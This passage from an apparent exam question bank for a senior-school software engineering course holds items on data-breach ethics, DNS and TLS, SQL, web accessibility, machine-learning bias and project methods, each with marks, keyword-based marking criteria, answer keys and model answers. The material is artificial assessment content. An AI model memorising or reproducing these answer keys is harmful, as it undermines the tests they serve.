      why: 'SAST analyses source code without executing it, so it runs early in the pipeline and can point to specific lines. DAST tests a running application from the outside; penetration testing is a human-driven authorised attack.'
    }),
    Q({
      id: 'SSA-Q7', area: 'SSA', points: ['SSA-3.3'], outcome: 'SE-12-05', marks: 5, format: 'extended',
      media: scen('An Australian online retailer suffers a breach exposing 2.1 million customer records including names, addresses, dates of birth and partial payment details. The vulnerability was a known flaw in an open-source library that the team had not patched for 14 months.'),
      stem: 'Evaluate the social, ethical and legal issues and ramifications of this incident for the people affected and for the enterprise.',
      criteria: [
        { t: 'Data security ramifications — identity theft, fraud, credential reuse', kw: ['identity theft', 'fraud', 'scam', 'phishing', 'reuse'] },
        { t: 'Privacy ramifications — loss of control over personal information, inability to change DOB/address', kw: ['privacy', 'personal information', 'cannot change', 'permanent', 'control'] },
        { t: 'Legal — Privacy Act / Australian Privacy Principles / Notifiable Data Breaches obligations, penalties', kw: ['privacy act', 'app', 'notifiable', 'oaic', 'legal', 'penalt', 'regulat'] },
        { t: 'Ethical — duty of care, negligence in not patching a known flaw, transparency with customers', kw: ['ethic', 'negligen', 'duty', 'responsib', 'transparen', 'disclose'] },
        { t: 'Enterprise ramifications — reputation, financial cost, employment, digital disruption', kw: ['reputation', 'trust', 'cost', 'customers leave', 'employment', 'share', 'disrupt'] }
      ],
      sample: 'For individuals, the ramifications are severe and lasting. Names, addresses and dates of birth are the exact identifiers used to open accounts fraudulently, so victims face elevated identity-theft and targeted phishing risk — and unlike a password, a date of birth or address history cannot be reset, so the harm is effectively permanent. Partial payment data enables convincing social engineering. Privacy is lost in a way the individual cannot remedy: they surrendered this information for a transaction, not for indefinite exposure, and they had no control over the retailer’s patching decisions. Legally, the retailer is bound by the Privacy Act 1988 (Cth) and the Australian Privacy Principles, particularly APP 11, which requires reasonable steps to protect personal information; leaving a known, published vulnerability unpatched for 14 months is difficult to characterise as reasonable. The Notifiable Data Breaches scheme obliges the retailer to assess and notify affected individuals and the OAIC promptly, and the regulator may investigate and impose substantial civil penalties. Ethically, the company owed a duty of care proportionate to the sensitivity of what it held; the failure was not a sophisticated zero-day but negligence in maintenance, and the ethical response requires prompt, complete and non-minimising disclosure, funded remediation such as credit monitoring, and an independent review. For the enterprise, the ramifications extend beyond the fine: loss of customer trust and the resulting churn, remediation and legal costs, possible class action, the diversion of engineering effort from product work, and reputational damage that advantages competitors — a form of digital disruption in which security becomes the differentiator. There are also employment consequences, both for those held accountable and in the creation of security and compliance roles the company evidently lacked. The incident is best understood as a failure of process rather than of technology: dependency monitoring, a patching policy with defined timeframes, and vulnerability assessment in the CI pipeline would have prevented it at a fraction of the cost.'
    }),

    /* ===================== PROGRAMMING FOR THE WEB ===================== */
    Q({
      id: 'WEB-Q1', area: 'WEB', points: ['WEB-1.3'], outcome: 'SE-12-03', marks: 1, format: 'mcq',
      stem: 'A mail client is configured to leave messages on the server so that the same inbox is synchronised across a phone and a laptop. Which protocol and default port is it using?',
      options: ['POP3 on port 110', 'IMAP on port 143', 'SMTP on port 25', 'FTP on port 21'],
      answer: 1,
      why: 'IMAP synchronises mail across multiple devices by leaving messages on the server (port 143, or 993 with TLS). POP3 typically downloads and removes mail; SMTP sends rather than retrieves.'
    }),
    Q({
      id: 'WEB-Q2', area: 'WEB', points: ['WEB-1.2'], outcome: 'SE-12-03', marks: 4, format: 'short',
      stem: 'Describe what happens between a user typing https://shop.example.com.au into a browser and the first byte of the page arriving. Refer to DNS, IP addressing, packets and TCP.',
      criteria: [
        { t: 'DNS resolution described as a lookup chain (cache → resolver → root → TLD → authoritative)', kw: ['dns', 'resolver', 'root', 'tld', 'authoritative', 'cache', 'name server'] },
        { t: 'Result is an IP address used to address the request', kw: ['ip address', 'ipv4', 'ipv6'] },
        { t: 'TCP connection/handshake established, reliable ordered delivery', kw: ['tcp', 'handshake', 'syn', 'connection', 'reliable', 'ordered'] },
        { t: 'Data split into packets with headers, routed independently, reassembled', kw: ['packet', 'header', 'reassembl', 'route', 'sequence'] }
      ],
      sample: 'The browser first resolves the domain to an IP address. It checks its own cache, then the operating system cache, then queries the configured DNS resolver, which if necessary asks a root name server, then the .au TLD name server, then the authoritative name server for example.com.au, returning an IPv4 address such as 203.0.113.25. The browser then opens a TCP connection to port 443 on that address using the three-way handshake (SYN, SYN-ACK, ACK), and because the scheme is HTTPS a TLS handshake follows in which the server presents its certificate and a symmetric session key is agreed. The HTTP GET request is then sent. All of this data is divided into packets, each carrying a header with source and destination IP addresses, a sequence number and a checksum; routers forward packets independently and they may take different paths and arrive out of order. TCP at the destination uses the sequence numbers to reassemble them in order, acknowledges what it received, and requests retransmission of anything lost — which is why the page arrives intact even though the network itself does not guarantee delivery.'
    }),
    Q({
      id: 'WEB-Q3', area: 'WEB', points: ['WEB-2.13'], outcome: 'SE-12-02', marks: 3, format: 'short',
      media: code('sql', `-- Tables
-- students(studentID, surname, yearGroup)
-- results(resultID, studentID, courseID, mark)
-- courses(courseID, courseName)`),
      stem: 'Write a single SQL statement that lists each course name together with the number of results and the average mark, for Year 12 students only, showing only courses whose average exceeds 70, ordered from highest average to lowest.',
      criteria: [
        { t: 'Uses JOIN across the three tables on the correct keys', kw: ['join', 'on', 'studentid', 'courseid'] },
        { t: 'Uses GROUP BY courseName with COUNT and AVG', kw: ['group by', 'count(', 'avg('] },
        { t: 'Filters Year 12 with WHERE and the average with HAVING, ordered DESC', kw: ['where', 'having', 'order by', 'desc', '70'] }
      ],
      sample: 'SELECT c.courseName, COUNT(*) AS entries, AVG(r.mark) AS average\nFROM results r\nJOIN students s ON r.studentID = s.studentID\nJOIN courses  c ON r.courseID  = c.courseID\nWHERE s.yearGroup = 12\nGROUP BY c.courseName\nHAVING AVG(r.mark) > 70\nORDER BY average DESC;\n\nWHERE filters individual rows before grouping (Year 12 only); HAVING filters the groups after aggregation (average above 70). Using WHERE AVG(...) would be invalid.'
    }),
    Q({
      id: 'WEB-Q4', area: 'WEB', points: ['WEB-2.2', 'WEB-2.10'], outcome: 'SE-12-07', marks: 4, format: 'short',
      media: dgm('webstack'),
      stem: 'A student argues that because their web app validates all input in JavaScript before submitting the form, server-side validation is unnecessary. Using the model of a web development system, explain why this reasoning is incorrect.',
      criteria: [
        { t: 'Client-side code runs in the user’s browser and is fully under the user’s control', kw: ['browser', 'client', 'user control', 'modif', 'disable', 'dev tools'] },
        { t: 'Requests can be sent directly to the server, bypassing the front end entirely', kw: ['bypass', 'curl', 'postman', 'directly', 'api', 'http request'] },
        { t: 'The server is the trust boundary — it is the only place validation is a security control', kw: ['trust', 'server-side', 'security control', 'authoritative'] },
        { t: 'States the correct role of client-side validation — usability/fast feedback', kw: ['usability', 'feedback', 'user experience', 'convenience', 'immediate'] }
      ],
      sample: 'Client-side JavaScript executes in the user’s own browser, which the user fully controls: they can edit the script in dev tools, disable JavaScript entirely, or change the HTML attributes that constrain the form. More fundamentally, the front end is not a required part of the request — an attacker can use curl or Postman to send an HTTP request straight to the back-end endpoint, never loading the page at all, so any check that exists only in the front end simply does not run. The server is the trust boundary in the three-tier model: it is the only component the developer controls, so validation, sanitisation and authorisation there are the actual security controls, and the database adds a further layer through constraints. Client-side validation is still worth implementing, but its purpose is usability — immediate feedback without a round trip, and fewer wasted requests — not security.'
    }),
    Q({
      id: 'WEB-Q5', area: 'WEB', points: ['WEB-1.4'], outcome: 'SE-12-04', marks: 4, format: 'short',
      media: dgm('tlshandshake'),
      stem: 'Using the sequence shown, explain the role of asymmetric encryption, symmetric encryption, the SSL certificate and hash values in securing a connection to a website.',
      criteria: [
        { t: 'SSL certificate proves the server’s identity, issued and vouched for by a Certificate Authority', kw: ['certificate', 'certificate authority', 'ca', 'identity', 'trust'] },
        { t: 'Asymmetric encryption used to exchange the session key (public key encrypts, private key decrypts)', kw: ['asymmetric', 'public key', 'private key', 'exchange'] },
        { t: 'Symmetric encryption used for the bulk data because it is far faster', kw: ['symmetric', 'session key', 'aes', 'faster', 'bulk'] },
        { t: 'Hash values provide integrity (and underpin signatures)', kw: ['hash', 'integrity', 'altered', 'digest', 'signature'] }
      ],
      sample: 'The client offers its supported ciphers; the server replies with its SSL certificate, which binds the server’s public key to its domain name and is digitally signed by a Certificate Authority the browser already trusts — this authenticates the server and is what prevents an impostor site from impersonating the domain. The client verifies that signature, then uses the server’s public key (asymmetric encryption) to send a pre-master secret that only the holder of the matching private key can decrypt. Both sides derive the same symmetric session key from it. All subsequent application data is encrypted symmetrically, typically with AES, because symmetric encryption is far faster than asymmetric and the volume of data is large; asymmetric encryption is used only to bootstrap the session. Hash values provide integrity: each record carries a message authentication code derived from a hash, so any alteration in transit is detected, and the certificate’s digital signature is itself a hash of the certificate encrypted with the CA’s private key, which is what makes tampering with the certificate detectable.'
    }),
    Q({
      id: 'WEB-Q6', area: 'WEB', points: ['WEB-2.1', 'WEB-2.16'], outcome: 'SE-12-05', marks: 4, format: 'extended',
      media: scen('A council is replacing its rates-payment website. The current site uses light grey text on white, conveys errors only by turning fields red, requires a mouse to open its navigation menu, and has no text alternatives for its infographic explaining rate calculations.'),
      stem: 'Explain the role of the W3C in web development and evaluate the current site against the Web Accessibility Initiative, recommending specific improvements.',
      criteria: [
        { t: 'Explains W3C as the body developing open standards for interoperability', kw: ['w3c', 'standard', 'interoperab', 'open', 'consortium'] },
        { t: 'Identifies the contrast failure and recommends a compliant ratio', kw: ['contrast', '4.5', 'ratio', 'grey', 'legib'] },
        { t: 'Identifies reliance on colour alone and recommends text/icon error messages', kw: ['colour alone', 'color alone', 'red', 'text message', 'icon', 'colour blind', 'color blind'] },
        { t: 'Identifies keyboard inaccessibility and missing alt text, recommending fixes', kw: ['keyboard', 'focus', 'tab', 'alt', 'text alternative', 'screen reader'] }
      ],
      sample: 'The W3C is the international body that develops the open standards underpinning the web — HTML, CSS, accessibility, internationalisation, security and machine-readable data — so that content authored once behaves consistently across browsers, devices and assistive technologies rather than being tied to one vendor. Its Web Accessibility Initiative publishes WCAG, built on four principles: content must be perceivable, operable, understandable and robust. The council site fails on all four counts. Light grey on white fails the perceivable requirement for contrast; body text needs a contrast ratio of at least 4.5:1, so the text colour should be darkened and verified with a contrast checker. Conveying errors only by turning a field red also fails perceivability for users with colour vision deficiency and for screen-reader users, who receive nothing at all; each error should be accompanied by text describing the problem and how to fix it, programmatically associated with the field and announced via a live region. Requiring a mouse to open the navigation fails operability; all functionality must be reachable and usable by keyboard alone, with a visible focus indicator and logical tab order. The infographic with no text alternative fails perceivability and robustness; it needs descriptive alt text, and because it conveys a calculation, a full text or table equivalent should also be provided. For a council service these are not optional refinements: rates payment is an essential public service that residents with disability must be able to complete independently, and public sector accessibility obligations apply.'
    }),
    Q({
      id: 'WEB-Q7', area: 'WEB', points: ['WEB-2.14'], outcome: 'SE-12-06', marks: 1, format: 'mcq',
      stem: 'Which statement best describes a disadvantage of using an Object-Relational Mapping (ORM) layer rather than writing SQL directly?',
      options: [
        'An ORM cannot enforce relationships between tables',
        'An ORM may generate inefficient queries, such as the N+1 problem, that a hand-written query would avoid',
        'An ORM makes the application dependent on one specific database engine',
        'An ORM increases the risk of SQL injection'
      ],
      answer: 1,
      why: 'ORMs trade control for productivity, and the generated SQL can be inefficient — the N+1 problem issues one query per related record instead of a single join. ORMs in fact improve portability and reduce injection risk because they parameterise by default.'
    }),
    Q({
      id: 'WEB-Q8', area: 'WEB', points: ['WEB-2.8'], outcome: 'SE-12-06', marks: 3, format: 'short',
      media: log(`GET /            200   1.8 MB   4.2 s
GET /css/app.css 200   412 KB   0.9 s   (unminified)
GET /js/bundle.js 200  2.1 MB   3.1 s   (includes 6 unused libraries)
GET /img/hero.png 200  4.7 MB   6.8 s   (3840x2160, served to a 390px phone)
GET /api/products 200  880 KB   1.4 s   (returns all 4000 products)
Total load time: 14.6 s   |  Lighthouse performance score: 23`),
      stem: 'Analyse the performance log above and recommend three specific methods to manage the load time of this web application.',
      criteria: [
        { t: 'Addresses the oversized image (compression, modern format, responsive srcset, lazy loading)', kw: ['image', 'compress', 'webp', 'srcset', 'responsive', 'resize', 'lazy'] },
        { t: 'Addresses the JavaScript bundle (minify, tree-shake, remove unused libraries, code splitting, defer)', kw: ['minif', 'tree shak', 'tree-shak', 'unused', 'split', 'defer', 'bundle'] },
        { t: 'Addresses CSS minification, caching/CDN, or paginating the API response', kw: ['css', 'minif', 'cdn', 'cach', 'paginat', 'gzip', 'brotli', 'compress'] }
      ],
      sample: '(1) The hero image is the single biggest cost at 4.7 MB: a 3840×2160 PNG is being sent to a 390 px phone. Serve appropriately sized images with a srcset/picture element, convert to WebP or AVIF, compress, and lazy-load anything below the fold — this alone should remove several megabytes and most of the 6.8 s. (2) The 2.1 MB JavaScript bundle includes six unused libraries: minify, tree-shake and code-split so only the code needed for the first view is loaded, defer non-critical scripts, and audit dependencies to remove what is unused. (3) Minify and compress the CSS with gzip or Brotli, serve all static assets from a CDN with long cache lifetimes and content hashing, and paginate /api/products so the first view requests 20 products rather than all 4000. Together these address payload size, request efficiency and caching, which are the three levers that matter for load time.'
    }),

    /* ===================== SOFTWARE AUTOMATION ========================= */
    Q({
      id: 'AUT-Q1', area: 'AUT', points: ['AUT-1.3'], outcome: 'SE-12-03', marks: 1, format: 'mcq',
      stem: 'A model is given thousands of unlabelled customer transaction records and asked to discover natural groupings of purchasing behaviour. Which model of training is being used?',
      options: ['Supervised learning', 'Unsupervised learning', 'Semi-supervised learning', 'Reinforcement learning'],
      answer: 1,
      why: 'Unsupervised learning finds structure in unlabelled data — clustering customers into segments is the classic example. Supervised learning requires labelled examples; reinforcement learning learns from reward signals in an environment.'
    }),
    Q({
      id: 'AUT-Q2', area: 'AUT', points: ['AUT-1.2'], outcome: 'SE-12-03', marks: 2, format: 'short',
      stem: 'Distinguish between artificial intelligence and machine learning, using an example of an AI system that does not use machine learning.',
      criteria: [
        { t: 'AI defined as the broad field of machines performing tasks requiring human-like intelligence', kw: ['broad', 'field', 'intelligen', 'subset', 'umbrella'] },
        { t: 'ML defined as learning patterns from data rather than explicit rules, and identified as a subset of AI', kw: ['data', 'learn', 'pattern', 'subset', 'train'] },
        { t: 'Gives a valid rule-based AI example (expert system, chess minimax, pathfinding, rule-based chatbot)', kw: ['expert system', 'rule', 'chess', 'minimax', 'a*', 'pathfinding', 'decision rules'] }
      ],
      sample: 'Artificial intelligence is the broad field concerned with machines performing tasks that would normally require human intelligence, such as reasoning, perception and decision-making. Machine learning is a subset of AI in which the system improves its performance on a task by learning statistical patterns from data, rather than following rules a programmer has written. An AI system that uses no machine learning is a rule-based expert system — for example a medical triage system that applies a fixed decision tree written by clinicians, or a chess engine using minimax search with a hand-coded evaluation function. Both exhibit intelligent behaviour, but neither learns from data: their behaviour changes only when a human edits the rules.'
    }),
    Q({
      id: 'AUT-Q3', area: 'AUT', points: ['AUT-2.1', 'AUT-1.6'], outcome: 'SE-12-02', marks: 4, format: 'short',
      media: code('python', `class LinearRegression:
    def fit(self, xs, ys):
        n = len(xs)
        mx, my = sum(xs)/n, sum(ys)/n
        self.m = sum((xs[i]-mx)*(ys[i]-my) for i in range(n)) / sum((x-mx)**2 for x in xs)
        self.b = my - self.m*mx
        return self
    def predict(self, x):
        return self.m*x + self.b

model = LinearRegression().fit([1,2,3,4,5], [3,5,7,9,11])
print(model.m, model.b, model.predict(10))`),
      stem: 'Explain what this class computes, state the output of the final line, and explain one limitation of using linear regression for prediction.',
      criteria: [
        { t: 'Explains least-squares fitting of a line of best fit, gradient m and intercept b', kw: ['line of best fit', 'gradient', 'slope', 'intercept', 'least squares', 'y = mx'] },
        { t: 'States the output: m = 2.0, b = 1.0, prediction = 21.0', kw: ['2.0', '1.0', '21'] },
        { t: 'Identifies a limitation (assumes linearity, sensitive to outliers, extrapolation unreliable, correlation ≠ causation)', kw: ['linear', 'outlier', 'extrapolat', 'causation', 'non-linear', 'curve'] },
        { t: 'Explains the consequence of that limitation', kw: ['wrong', 'inaccurate', 'misleading', 'poor predict', 'skew', 'unreliable', 'over-predict', 'under-predict', 'disproportionate'] }
      ],
      sample: 'The class fits a least-squares line of best fit: fit() calculates the gradient m as the covariance of x and y divided by the variance of x, and the intercept b so the line passes through the mean point, while predict() applies y = mx + b. For the data given, the relationship is exactly y = 2x + 1, so m = 2.0, b = 1.0 and predict(10) returns 21.0. A key limitation is that linear regression assumes a straight-line relationship: if the true relationship curves — study hours versus marks will plateau, since no amount of study exceeds 100% — the model systematically under- or over-predicts at the extremes, and polynomial regression would fit better. The model is also highly sensitive to outliers, because squaring the errors gives a single extreme point disproportionate influence on the gradient, and extrapolating far beyond the range of the training data is unreliable regardless of how well the line fits within it.'
    }),
    Q({
      id: 'AUT-Q4', area: 'AUT', points: ['AUT-3.3'], outcome: 'SE-12-05', marks: 5, format: 'extended',
      media: scen('A company builds an ML model to shortlist job applicants. It is trained on 10 years of the company’s own hiring decisions. In testing, the model shortlists applicants from one university at triple the rate of equally qualified applicants from others, and ranks applicants with a gap in employment history significantly lower.'),
      stem: 'Investigate the effect of human and dataset source bias in this solution, and recommend how the development team should respond.',
      criteria: [
        { t: 'Identifies dataset source bias — training on historical decisions encodes past human preferences', kw: ['historical', 'past decisions', 'dataset', 'training data', 'encode', 'reflect'] },
        { t: 'Identifies human bias in feature/label/metric choice', kw: ['feature', 'label', 'proxy', 'metric', 'developer', 'choice'] },
        { t: 'Explains a concrete harm (discrimination, proxy for protected attributes, feedback loop)', kw: ['discriminat', 'proxy', 'unfair', 'feedback loop', 'caregiv', 'disability', 'socioeconomic'] },
        { t: 'Recommends mitigation — subgroup accuracy measurement, dataset auditing/documentation, diverse teams', kw: ['audit', 'subgroup', 'measure', 'diverse', 'document', 'datasheet', 'test'] },
        { t: 'Recommends human oversight / not automating the consequential decision', kw: ['human oversight', 'human in the loop', 'review', 'not automat', 'advisory', 'appeal'] }
      ],
      sample: 'The core problem is dataset source bias: the model is trained on the company’s own past hiring decisions, so it does not learn who performs well in the role — it learns to reproduce who the company has previously chosen, including every bias those human decisions contained. The university effect is a textbook example: historical recruiters favoured one institution, so the label "hired" correlates with that university, and the model treats it as predictive merit. University attended is also a proxy for socioeconomic background, so the model discriminates indirectly on an attribute it was never given. Penalising employment gaps is more serious still, because gaps correlate strongly with caregiving, illness and disability, meaning the model systematically disadvantages protected groups while appearing neutral. Human bias compounds this through the developers’ choices: selecting "was hired" as the target label, including features like university and continuous employment, and evaluating with aggregate accuracy, which can look excellent while the model fails badly for a minority subgroup. Left in production the system creates a feedback loop — its shortlists become next year’s training data, entrenching the pattern.\n\nThe team should stop deployment and audit the dataset, documenting its provenance, composition and known gaps in a datasheet. Accuracy and shortlisting rates must be measured per subgroup rather than in aggregate, with disparities treated as defects. Features that act as proxies for protected attributes, including university and employment continuity, should be removed or their influence tested directly. The target label should be re-examined: on-the-job performance ratings, if available and themselves audited, are a better target than past hiring decisions. A more diverse team and consultation with affected groups would surface harms the current team did not anticipate. Finally, given the consequence of the decision, the model should be advisory only, with human review of every rejection, a documented appeals process, and ongoing monitoring after deployment — bias is not a defect that is fixed once, but a property that must be measured continuously.'
    }),
    Q({
      id: 'AUT-Q5', area: 'AUT', points: ['AUT-1.1'], outcome: 'SE-12-01', marks: 3, format: 'short',
      media: dgm('pipeline'),
      stem: 'Using Figure E4, explain how machine learning could support automation at two different stages of this DevOps pipeline.',
      criteria: [
        { t: 'Correctly describes the pipeline as continuous integration/deployment with automated gates', kw: ['continuous integration', 'ci', 'cd', 'automat', 'pipeline', 'deploy'] },
        { t: 'Gives a valid ML application at the test/build stage (predicting failures, test selection, triaging flaky tests, prioritising SAST findings)', kw: ['predict', 'test selection', 'flaky', 'triage', 'prioritis', 'false positive'] },
        { t: 'Gives a valid ML application at staging/production (anomaly detection in logs, auto-scaling, canary analysis, rollback)', kw: ['anomaly', 'log', 'scal', 'monitor', 'rollback', 'canary'] }
      ],
      sample: 'The pipeline automates the path from commit to production, with each stage acting as a quality gate and a failure routing the change back to the developer. At the automated test stage, machine learning can perform predictive test selection: a model trained on which tests historically fail for which kinds of change runs the highest-risk subset first, cutting feedback time from hours to minutes, and can classify flaky tests so that genuine regressions are not lost among intermittent failures. It can also rank SAST findings by the likelihood of being a true positive, so reviewers address real vulnerabilities first. At the staging and production stages, ML supports anomaly detection: a model of normal log, latency and error-rate behaviour flags deviations after a deployment and can trigger an automatic rollback (canary analysis) before users are widely affected, and predictive auto-scaling provisions capacity ahead of forecast demand rather than reacting after response times degrade.'
    }),
    Q({
      id: 'AUT-Q6', area: 'AUT', points: ['AUT-3.1'], outcome: 'SE-12-05', marks: 4, format: 'extended',
      stem: 'Assess the impact of automation on the individual, society and the environment. Refer to at least three of the aspects named in the syllabus.',
      criteria: [
        { t: 'Safety of workers — removal from hazardous tasks, plus new risks', kw: ['safety', 'hazard', 'danger', 'injur', 'collision'] },
        { t: 'Employment — displacement of routine roles and growth of new skill requirements', kw: ['employ', 'job', 'displac', 'reskill', 'retrain', 'skills'] },
        { t: 'Environment — efficiency and waste reduction vs energy use and e-waste', kw: ['environment', 'waste', 'energy', 'emission', 'e-waste', 'efficien'] },
        { t: 'Makes a judgement rather than only listing (assess)', kw: ['overall', 'however', 'on balance', 'therefore', 'benefit outweigh', 'depends'] }
      ],
      sample: 'Automation removes workers from hazardous tasks — handling chemicals, working at height, repetitive lifting that causes long-term injury — which is an unambiguous gain in worker safety. It introduces new hazards, however: humans working alongside robots require guarding, force limits and clear emergency stops, and automation complacency can reduce the vigilance of the human supervisor who is meant to catch failures. For employment, routine and predictable roles — data entry, basic quality inspection, some driving and warehousing — are most exposed to displacement, while demand grows for roles in system design, data work and maintenance. The difficulty is that these are not the same people: the benefit accrues to those able to retrain, and the cost falls on workers with the least capacity to absorb it, which is why the distributional effect matters as much as the net job count. Environmentally the picture is genuinely mixed: optimised processes reduce material waste, route planning cuts fuel use, and precision agriculture reduces water and pesticide application; against that, training large models consumes substantial electricity and water for cooling, and shortened hardware replacement cycles generate e-waste. On balance, automation\'s benefits are real but unevenly distributed, and whether the overall impact is positive depends less on the technology than on the policy and design decisions around it — whether retraining is funded, whether safety standards are enforced, and whether efficiency gains are reinvested rather than simply increasing consumption.'
    }),

    /* ===================== SOFTWARE ENGINEERING PROJECT ================ */
    Q({
      id: 'SEP-Q1', area: 'SEP', points: ['SEP-1.3'], outcome: 'SE-12-01', marks: 1, format: 'mcq',
      stem: 'A hospital replaces its patient records system by running the old and new systems simultaneously for two months and comparing their outputs daily. Which implementation method is this?',
      options: ['Direct', 'Phased', 'Parallel', 'Pilot'],
      answer: 2,
      why: 'Parallel implementation runs both systems at once so outputs can be compared and the old system remains as a fallback. It is the lowest risk and the highest cost, which is why it suits safety-critical contexts like a hospital.'
    }),
    Q({
      id: 'SEP-Q2', area: 'SEP', points: ['SEP-2.3', 'SEP-2.1', 'SEP-2.2'], outcome: 'SE-12-01', marks: 5, format: 'extended',
      media: scen('A state government agency is commissioning a public transport fare app. The agency requires a fixed contract price, signed-off requirements and formal milestone reporting to a minister. The development team knows the user interface will need several rounds of public usability testing before it is right.'),
      stem: 'Justify the use of the WAgile software development approach for this project, comparing it with pure Waterfall and pure Agile.',
      criteria: [
        { t: 'Describes WAgile as a hybrid of Waterfall governance with Agile iterations', kw: ['hybrid', 'combin', 'both', 'wagile'] },
        { t: 'Explains when/how the intervention is applied — up-front planning and stage gates, sprints inside the build phase', kw: ['stage gate', 'up-front', 'milestone', 'sprint', 'build phase', 'planning phase'] },
        { t: 'Explains why pure Waterfall is unsuitable (UI cannot be specified up front, late feedback)', kw: ['waterfall', 'inflexib', 'late', 'cannot change', 'usability'] },
        { t: 'Explains why pure Agile is unsuitable (fixed price, sign-off, ministerial reporting)', kw: ['agile', 'fixed price', 'contract', 'sign-off', 'reporting', 'scope'] },
        { t: 'Reaches a justified recommendation referring to scale and type of development', kw: ['scale', 'large', 'recommend', 'therefore', 'suited'] }
      ],
      sample: 'WAgile is a hybrid model that keeps Waterfall’s up-front analysis, documentation and formal stage gates while running Agile iterations inside the phases where requirements are genuinely uncertain. For this project the intervention is applied at the design and build phases: requirements definition, specification, architecture and the contract are completed and signed off in a Waterfall manner, giving the agency the fixed price, documented scope and milestone reporting it requires, and then the user interface is developed in two-week sprints with public usability testing at the end of each, feeding back into the next iteration before the next stage gate.\n\nPure Waterfall would fail because the interface cannot be correctly specified in advance — the team already knows several rounds of usability testing are needed, and Waterfall surfaces that feedback only at system testing, when changing the design is most expensive. Pure Agile would fail for contractual rather than technical reasons: a fixed-price government contract with ministerial milestone reporting requires a defined scope and auditable progress against it, which an emergent backlog does not provide, and the agency cannot sign a contract for "whatever the team delivers in twenty sprints". WAgile is therefore justified for this scale and type of development — a large, externally governed public-sector project with a genuinely uncertain user-facing component. The governance structure is satisfied at the stage gates while the risk concentrated in the UI is managed iteratively, and the main cost of the approach, the overhead of maintaining both documentation and sprint ceremonies, is acceptable on a project of this size.'
    }),
    Q({
      id: 'SEP-Q3', area: 'SEP', points: ['SEP-4.4', 'SEP-4.1'], outcome: 'SE-12-08', marks: 4, format: 'short',
      media: code('text', `Requirement R3: The booking form must accept a group size from 1 to 8.

Test log:
  input 0   -> accepted, booking created      [expected: rejected]
  input 1   -> accepted, booking created      [expected: accepted]
  input 8   -> rejected, "too large"          [expected: accepted]
  input 9   -> rejected, "too large"          [expected: rejected]
  input "x" -> application crash, stack trace [expected: error message]`),
      stem: 'Analyse the test log and evaluate the effectiveness of the solution against requirement R3. Identify the defects and the likely cause of the boundary failures.',
      criteria: [
        { t: 'Identifies that 0 is wrongly accepted and 8 is wrongly rejected — both boundary failures', kw: ['0', '8', 'boundary', 'off by one', 'off-by-one'] },
        { t: 'Diagnoses the likely cause as incorrect comparison operators (> 0 written as >= 0, < 8 instead of <= 8)', kw: ['operator', '<=', '>=', 'greater than', 'less than', 'comparison'] },
        { t: 'Identifies the crash on non-numeric input as missing type validation/error handling', kw: ['validat', 'type', 'error handling', 'crash', 'exception', 'try'] },
        { t: 'Makes an overall judgement — requirement not met, solution not fit for release', kw: ['not met', 'fail', 'not effective', 'not fit', 'must be fixed'] }
      ],
      sample: 'The solution does not satisfy R3. Three of the five test cases failed, and all three are significant. Group size 0 is accepted when it must be rejected, and group size 8 — a valid upper boundary value — is rejected, so the application both admits invalid data and refuses valid bookings. Both are classic off-by-one boundary errors and point to the same cause: the validation condition is almost certainly written as `size >= 0 and size < 8` instead of `size >= 1 and size <= 8`. The crash on non-numeric input is a separate and more serious defect: the input is being converted without type validation or exception handling, so an unhandled exception terminates the request and exposes a stack trace, which is both an availability failure and an information disclosure risk. Judged against functionality the solution is not fit for release; the fix is to correct the comparison operators to the inclusive range and to validate the input as a whole number inside a try/except block that returns a clear error message. The test set should then be re-run, and a case for an empty submission added, since path coverage is currently incomplete.'
    }),
    Q({
      id: 'SEP-Q4', area: 'SEP', points: ['SEP-2.4'], outcome: 'SE-12-09', marks: 3, format: 'short',
      stem: 'Explain how a Gantt chart supports the management of a software engineering project, referring to dependencies, milestones and the critical path.',
      criteria: [
        { t: 'Describes the structure — tasks against a timeline with bars showing duration', kw: ['task', 'timeline', 'bar', 'duration', 'horizontal'] },
        { t: 'Explains dependencies — tasks that cannot start until another finishes', kw: ['depend', 'cannot start', 'predecessor', 'sequence', 'order'] },
        { t: 'Explains milestones and/or critical path and their use in tracking', kw: ['milestone', 'critical path', 'slip', 'deadline', 'track', 'progress'] }
      ],
      sample: 'A Gantt chart lists project tasks down the vertical axis against time along the horizontal axis, with a bar whose length shows each task’s duration and whose position shows when it occurs, so the whole schedule is visible at once. Arrows between bars show dependencies — for example, integration testing cannot begin until both the front-end and back-end modules are complete — which makes it clear why delaying one task delays others. Milestones, drawn as diamonds, mark deliverables such as "prototype demonstrated to client" and give fixed checkpoints to report against. The critical path is the longest chain of dependent tasks: any slippage on it directly delays the project, so it identifies where management attention and resources should go, while tasks off the critical path have float and can absorb some delay. During development, shading the completed portion of each bar allows actual progress to be compared with the plan, so slippage is detected early enough to respond by renegotiating scope or reallocating resources.'
    }),
    Q({
      id: 'SEP-Q5', area: 'SEP', points: ['SEP-1.1'], outcome: 'SE-12-01', marks: 4, format: 'short',
      media: scen('"We want an app for the school canteen so it\'s not so chaotic at recess." — the canteen manager, in the initial client meeting.'),
      stem: 'Define and analyse the requirements of this problem. Your answer must demonstrate the need, generate functional and performance requirements, and define the boundaries of the solution.',
      criteria: [
        { t: 'Demonstrates the need with evidence that could be gathered (queue timing, surveys, observation)', kw: ['survey', 'observ', 'interview', 'data', 'queue', 'measure', 'evidence'] },
        { t: 'States functional requirements — what the system does', kw: ['functional', 'order', 'menu', 'payment', 'login', 'must be able'] },
        { t: 'States performance requirements — measurable', kw: ['performance', 'seconds', 'concurrent', 'users', 'uptime', 'response'] },
        { t: 'Defines boundaries — what is explicitly excluded', kw: ['boundar', 'out of scope', 'not include', 'exclud', 'will not'] }
      ],
      sample: 'The need must first be demonstrated with evidence rather than assumed: timing the recess queue over a week, counting unserved students at the bell, surveying students and canteen staff, and recording how many orders are mis-filled. If the data shows an average wait of nine minutes in a fifteen-minute break, the need is established and quantified, which also gives a baseline to evaluate against later.\n\nFunctional requirements: students can browse the current menu with prices and allergen information; place and pay for an order in advance; receive a collection time or number; cancel within a defined window; canteen staff can view a queue of orders, mark them fulfilled, and mark items sold out, which immediately removes them from the student menu; the manager can view daily sales totals.\n\nPerformance requirements: support 400 concurrent users during the ten minutes before recess; any page or action responds within two seconds on the school wi-fi; order submission must be atomic so a payment is never taken without an order being created; 99% availability during school hours.\n\nBoundaries: the solution covers pre-ordering and collection only. It excludes stock and supplier management, payroll, nutritional analysis, integration with the school’s finance system, and home delivery. Payment is handled through an existing gateway rather than built, so card data never touches our system. Students without a smartphone must still be able to order at the counter — the app supplements the existing process rather than replacing 